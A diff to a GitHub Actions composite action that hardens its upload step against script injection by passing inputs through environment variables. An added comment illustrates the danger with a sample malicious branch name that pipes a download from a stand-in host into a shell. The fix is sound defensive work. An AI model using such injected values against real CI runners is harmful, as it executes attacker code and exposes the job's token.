@@ -96,24 +96,32 @@ runs:
     - name: Upload results
       shell: bash
       env:
-        # Passed through the environment rather than the command line so the
-        # token never appears in a process listing or a rendered command in
-        # the Actions log.
+        # Every value the script uses is bound here and referenced as "$VAR",
+        # rather than interpolated into the script body with ${{ }}.
+        #
+        # This is not style. `github.head_ref` is the branch name on the pull
+        # request's *source* repository, which on a fork is chosen by whoever
+        # opened it. Interpolation happens before bash sees the script, so a
+        # branch named `x"; curl evil.sh | sh; #` becomes a command on the
+        # runner - with this job's ingestion token in its environment. The
+        # same is true of any `inputs.*` a caller controls.
+        #
+        # Binding to env defuses it: the value arrives as data, and bash
+        # never parses it as syntax.
         MYKRONOS_TOKEN: ${{ inputs.token }}
+        CAPABILITY: ${{ inputs.capability }}
+        TOOL: ${{ inputs.tool }}
+        TOOL_VERSION: ${{ inputs.tool-version }}
+        RESULTS_PATH: ${{ inputs.results-path }}
+        INGESTION_URL: ${{ inputs.ingestion-url }}
+        SEVERITY_THRESHOLD: ${{ inputs.severity-threshold }}
+        BLOCKING: ${{ inputs.blocking }}
+        REPO: ${{ github.repository }}
+        COMMIT_SHA: ${{ github.event.pull_request.head.sha || github.sha }}
+        BRANCH: ${{ github.head_ref || github.ref_name }}
+        WORKFLOW_RUN_ID: ${{ github.run_id }}
+        TRIGGERED_BY: ${{ github.event_name == 'pull_request' && 'pull_request' || (github.event_name == 'schedule' && 'schedule' || (github.event_name == 'workflow_dispatch' && 'workflow_dispatch' || 'push')) }}
+        PR_NUMBER: ${{ github.event.pull_request.number || 0 }}
+        WORKSPACE: ${{ github.workspace }}
       run: |
-        python -m mykronos.upload \
-          --capability "${{ inputs.capability }}" \
-          --tool "${{ inputs.tool }}" \
-          --tool-version "${{ inputs.tool-version }}" \
-          --results-path "${{ inputs.results-path }}" \
-          --ingestion-url "${{ inputs.ingestion-url }}" \
-          --token "$MYKRONOS_TOKEN" \
-          --repo "${{ github.repository }}" \
-          --commit-sha "${{ github.event.pull_request.head.sha || github.sha }}" \
-          --branch "${{ github.head_ref || github.ref_name }}" \
-          --workflow-run-id "${{ github.run_id }}" \
-          --triggered-by "${{ github.event_name == 'pull_request' && 'pull_request' || (github.event_name == 'schedule' && 'schedule' || (github.event_name == 'workflow_dispatch' && 'workflow_dispatch' || 'push')) }}" \
-          --pr-number "${{ github.event.pull_request.number || 0 }}" \
-          --workspace "${{ github.workspace }}" \
-          --severity-threshold "${{ inputs.severity-threshold }}" \
-          --blocking "${{ inputs.blocking }}"
+        python -m mykronos.upload           --capability "$CAPABILITY"           --tool "$TOOL"           --tool-version "$TOOL_VERSION"           --results-path "$RESULTS_PATH"           --ingestion-url "$INGESTION_URL"           --token "$MYKRONOS_TOKEN"           --repo "$REPO"           --commit-sha "$COMMIT_SHA"           --branch "$BRANCH"           --workflow-run-id "$WORKFLOW_RUN_ID"           --triggered-by "$TRIGGERED_BY"           --pr-number "$PR_NUMBER"           --workspace "$WORKSPACE"           --severity-threshold "$SEVERITY_THRESHOLD"           --blocking "$BLOCKING"
